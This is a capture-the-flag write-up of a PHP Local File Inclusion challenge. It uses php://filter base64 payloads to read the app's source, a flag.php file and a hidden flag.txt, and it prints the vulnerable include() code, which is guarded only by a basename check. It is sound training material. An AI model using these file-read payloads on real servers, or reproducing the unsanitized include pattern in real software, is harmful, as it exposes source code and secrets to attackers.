### Vulnerability: Local File Inclusion (LFI)

### Summary

This challenge demonstrates a classic **Local File Inclusion** vulnerability, where the web application includes files based on user input via a GET parameter. The vulnerability can be escalated using PHP wrappers to read otherwise restricted files.


### Steps to Exploit

1. Initial Reconnaissance

Navigate to:  
[https://cybersecure-x-web2.chals.io/challenge.php](https://cybersecure-x-web2.chals.io/challenge.php)

The hyperlinks to the "home" and "about" pages reveal how the endpoint works:

/challenge.php?page=home


The `page` parameter dynamically includes PHP files based on the value provided.


2. Direct Access Blocked

Attempting direct access to restricted files like `flag.php` using:

/flag.php
/challenge.php?page=flag.php

Returns an error or access denied. This confirms there's some input filtering.

![image](https://github.com/user-attachments/assets/0480ba5b-65b5-4fe1-9bf1-397eef72a3fe)

3. Bypass Using PHP Wrapper

We can bypass restrictions using the **`php://filter`** wrapper, which allows reading files through a filter chain.

Accessing the main script in base64-encoded format:

[https://cybersecure-x-web2.chals.io/challenge.php?page=php://filter/read=convert.base64-encode/resource=challenge.php](https://cybersecure-x-web2.chals.io/challenge.php?page=php://filter/read=convert.base64-encode/resource=challenge.php)

Decoded `challenge.php`:
```php
<?php
function show_page($page) {
    // Sirf direct access block karna hai flag.php ka
    $basename = basename($page);

    if ($basename === 'flag.php' || $basename === 'flag') {
        die("<h2 style='color: red;'>🚫 Direct access to flag file is forbidden!</h2>");
    }

    include($page); // Ab yeh pure page ya php://filter trick ko allow karega
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CyberPortal</title>
    <style>
        body {
            background-color: #f4f6f7;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        nav {
            background-color: #2c3e50;
            padding: 15px;
        }
        nav a {
            color: #ecf0f1;
            margin: 0 15px;
            text-decoration: none;
            font-weight: bold;
            font-size: 18px;
        }
        nav a:hover {
            text-decoration: underline;
        }
        .container {
            margin-top: 30px;
        }
    </style>
</head>
<body>

<nav>
    <a href="challenge.php?page=home.php">Home</a>
    <a href="challenge.php?page=about.php">About</a>
    <a href="challenge.php?page=contact.php">Contact</a>
</nav>

<div class="container">
<?php
if (isset($_GET['page'])) {
    $page = $_GET['page'];
    show_page($page);
} else {
    echo "<h1>Welcome to CyberPortal!</h1><p>Select a page from the navigation bar above.</p>";
}
?>
</div>

</body>
</html>
```
4. Read the Flag File (`flag.php`)

Next, we use the same technique to access the `flag.php` file:

[https://cybersecure-x-web2.chals.io/challenge.php?page=php://filter/read=convert.base64-encode/resource=flag.php](https://cybersecure-x-web2.chals.io/challenge.php?page=php://filter/read=convert.base64-encode/resource=flag.php)

Decoded `flag.php`:

```php
<?php
$flag = trim(file_get_contents(__DIR__ . '/this_is_a_very_secret_hidden_super_long_random_named_folder_xyz12345/flag.txt'));
if (!debug_backtrace()) {
    die("<h2 style='color: red;'>🚫 Direct access to this file is forbidden!</h2>");
}
echo $flag;
?>
```

This file contains a reference to a hidden folder and file.

5. Access Hidden Flag File

Using the leaked path from `flag.php`, we read the actual flag:

[https://cybersecure-x-web2.chals.io/challenge.php?page=php://filter/read=convert.base64-encode/resource=this\_is\_a\_very\_secret\_hidden\_super\_long\_random\_named\_folder\_xyz12345/flag.txt](https://cybersecure-x-web2.chals.io/challenge.php?page=php://filter/read=convert.base64-encode/resource=this_is_a_very_secret_hidden_super_long_random_named_folder_xyz12345/flag.txt)

#### Decoded `flag.txt`:

```text
flag{basic_lfi_successful}
```
